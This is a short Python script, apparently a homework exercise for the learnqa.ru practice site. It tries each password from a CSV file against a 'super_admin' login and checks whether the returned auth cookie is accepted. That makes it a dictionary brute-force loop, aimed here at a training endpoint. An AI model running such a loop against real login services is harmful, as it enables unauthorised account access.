import requests
import csv

with open("C:/Users/IT0054/Desktop/password.csv") as csvfile:
    # create a list to store results
    passwords = []
    reader = csv.reader(csvfile)

    for row in reader:
        password = row[0]

        payload = {"login": "super_admin", "password": password}
        print(payload)

        response = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data=payload)

        cookie_value = response.cookies.get('auth_cookie')
        cookies = {'auth_cookie': cookie_value}
        response_check = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies=cookies)
        if response_check.text == "You are authorized":
            print(response_check.text)



#print(response.text)
#print(response.status_code)
#print(dict(response.cookies))


